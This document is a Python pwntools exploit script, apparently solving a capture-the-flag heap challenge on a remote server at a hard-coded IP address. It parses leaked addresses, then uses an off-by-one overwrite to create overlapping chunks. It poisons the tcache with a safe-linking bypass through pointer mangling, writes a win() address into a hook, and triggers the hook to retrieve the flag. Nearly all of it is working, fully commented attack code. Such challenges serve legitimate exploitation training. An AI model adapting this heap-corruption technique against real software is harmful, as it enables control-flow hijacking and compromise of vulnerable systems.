#!/usr/bin/env python3
from pwn import *
import re

def solve():
    # 1. Connect and parse the leaks
    io = remote("212.2.250.33", 31185)
    
    greeting = io.recvuntil(b"> ")
    heap_base = int(re.search(rb"heap @ (0x[0-9a-f]+)", greeting).group(1), 16)
    win_addr = int(re.search(rb"win\(\)\s+@ (0x[0-9a-f]+)", greeting).group(1), 16)
    hook_addr = int(re.search(rb"hook\s+@ (0x[0-9a-f]+)", greeting).group(1), 16)

    log.success(f"Heap Base: {hex(heap_base)}")
    log.success(f"Win Func:  {hex(win_addr)}")
    log.success(f"Hook Dest: {hex(hook_addr)}")

    # Wrapper functions using exact prompts to prevent hanging
    def create(size, content):
        io.sendline(b"1")
        io.recvuntil(b"Size")
        io.sendline(str(size).encode())
        io.recvuntil(b"ontent:")
        io.send(content)       # We use send() instead of sendline() to avoid appending '\n'
        io.recvuntil(b"> ")

    def edit(idx, content):
        io.sendline(b"2")
        io.recvuntil(b"Index")
        io.sendline(str(idx).encode())
        io.recvuntil(b"ontent:")
        io.send(content)
        io.recvuntil(b"> ")

    def delete(idx):
        io.sendline(b"3")
        io.recvuntil(b"Index")
        io.sendline(str(idx).encode())
        io.recvuntil(b"> ")

    # ==========================================
    # Phase 1: Heap Layout
    # ==========================================
    log.info("Step 1: Setting up memory layout...")
    # Allocating 24 bytes forces a perfect 32-byte (0x20) chunk alignment
    create(24, b"A" * 24) # Note 0
    create(24, b"B" * 24) # Note 1
    create(24, b"C" * 24) # Note 2
    create(24, b"D" * 24) # Note 3 (Guard chunk prevents merging)

    # ==========================================
    # Phase 2: The Off-By-One Vulnerability
    # ==========================================
    log.info("Step 2: Triggering off-by-one to enlarge Note 1...")
    # Note 0 is completely full (24 bytes). By appending exactly 1 byte ("\x41"),
    # we bleed into Note 1's chunk header, changing its size from 0x21 to 0x41.
    edit(0, b"\x41")

    # ==========================================
    # Phase 3: Free chunks to populate Tcache
    # ==========================================
    log.info("Step 3: Freeing chunks to setup the overlap...")
    delete(1) # Note 1 thinks it is larger now, goes to the 0x40 tcache bin
    delete(2) # Note 2 goes to the normal 0x20 tcache bin

    # ==========================================
    # Phase 4: Safe-Linking Bypass & Poisoning
    # ==========================================
    log.info("Step 4: Poisoning Tcache (Bypassing glibc Safe-Linking)...")
    
    # Calculate exactly where Note 2's data lives in memory
    note2_pos = heap_base + 0x60
    
    # MANGLE THE POINTER: This is required for modern Ubuntu/glibc
    mangled_hook = hook_addr ^ (note2_pos >> 12)

    # We ask for 56 bytes (which grabs the enlarged Note 1 chunk).
    # This chunk literally overlaps Note 2, allowing us to overwrite Note 2's internals.
    payload = b"X" * 16              # Space originally used by Note 1
    payload += p64(0)                # Repair Note 2 prev_size
    payload += p64(0x21)             # Repair Note 2 size (Prevents 'corrupted size' crash)
    payload += p64(mangled_hook)     # Overwrite Note 2's Next Pointer with the Hook
    payload += b"Y" * 16             # Pad exactly to 56 bytes
    
    create(56, payload)

    # ==========================================
    # Phase 5: The Arbitrary Write
    # ==========================================
    log.info("Step 5: Extracting the poisoned chunks...")
    create(24, b"JUNKJUNK") # First allocation clears the original Note 2 chunk

    log.info("Step 6: Writing Win() address directly into the Hook...")
    # Second allocation lands EXACTLY on the Hook memory address!
    create(24, p64(win_addr) + b"\x00" * 16)

    # ==========================================
    # Phase 6: Trigger the Flag
    # ==========================================
    log.info("Step 7: Executing the Hook...")
    # The hook usually triggers on a note deletion
    io.sendline(b"3")
    io.recvuntil(b"Index")
    io.sendline(b"0")
    
    # Backup trigger just in case it executes on Exit
    io.sendline(b"5")

    # Catch and print the server's output
    log.success("Exploit complete! Grabbing the flag:")
    try:
        result = io.recvall(timeout=3).decode(errors='ignore')
        print("\n" + "="*40)
        print(result.strip())
        print("="*40 + "\n")
    except Exception as e:
        print(f"Error receiving flag: {e}")

if __name__ == "__main__":
    solve()